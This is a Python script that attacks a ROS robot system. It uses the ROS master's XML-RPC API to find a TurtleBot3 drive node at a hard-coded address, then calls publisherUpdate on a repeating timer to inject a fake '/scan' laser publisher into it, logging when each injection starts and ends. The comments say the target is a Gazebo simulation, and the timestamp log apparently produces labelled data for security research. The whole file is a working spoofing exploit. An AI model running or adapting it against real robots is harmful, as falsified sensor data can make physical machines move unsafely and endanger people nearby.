# This script locates a node, 'turtlebot3_Fake', from the local ROS master given
# It periodically injects that node as a publisher to a topic in another system
# This is specifically targetting a Turtlebot3 robot in a Gazebo simulation
# It also creates a file noting timestamps for when the node is injected

import xmlrpc.client as rpc
from time import sleep, time
from random import randrange

# Attack Interval values
attackInterval = 60  # The minimum length of time an attack can last
attackIntervalSpread = 60  # The amount of time an attack may vary between, uniformly spread
sleepInterval = 360  # How long this script waits between attacks

# Attack target
remote_ROS_master_RPC_URL = "http://192.168.246.131:11311"
# ROS Master we're getting turtlebot3_Fake from
local_ROS_master_RPC_URL = "http://localhost:11311"




# Declare RPC links to Remote ROS Master (which we're attacking) and Local ROS Master (which we're using to fake a node)
remoteRosMaster = rpc.ServerProxy(remote_ROS_master_RPC_URL)
localRosMaster = rpc.ServerProxy(local_ROS_master_RPC_URL)

# Find the URI's of:
_, _, subNodeURI = remoteRosMaster.lookupNode("/Ros_Services", "/turtlebot3_drive") # Subscriber we're attacking
_, _, originalPubNodeURI = remoteRosMaster.lookupNode("/Ros_Subscriber_Services", "/scan") # Publisher it's listening to
_, _, injectedPubNodeURI = localRosMaster.lookupNode("/Ros_Subscriber_Services", "turtlebot3_Fake") # Publisher we're injecting data from

# Print URI's to console
print(f"Target Subscriber URI: {subNodeURI}")
print(f"Original Publisher URI: {originalPubNodeURI}")
print(f"Fake Publisher URI: {injectedPubNodeURI}")

# Set up an RPC link to the subscriber
targetSubscriber = rpc.ServerProxy(subNodeURI)


print("Beginning Attack")
with open("attackTimestamps.txt", "w") as timeFile:
    while True:
        print(f"Publisher Update call to {subNodeURI} on '/scan': [{originalPubNodeURI},{injectedPubNodeURI}]")
        targetSubscriber.publisherUpdate("/Ros_Subscriber_Services", "/scan", [originalPubNodeURI,injectedPubNodeURI])
        timeFile.write(f"{time()} Attacker Injected\n")
        randomAttack = attackInterval + randrange(attackIntervalSpread)
        print(f"Waiting for {randomAttack} seconds...")
        sleep(randomAttack)

        print(f"Publisher Update call to {subNodeURI} on '/scan': [{originalPubNodeURI}]")
        targetSubscriber.publisherUpdate("/Ros_Subscriber_Services", "/scan", [originalPubNodeURI])
        timeFile.write(f"{time()} Attacker Removed\n")
        print(f"Waiting for {sleepInterval} seconds...")
        sleep(sleepInterval)
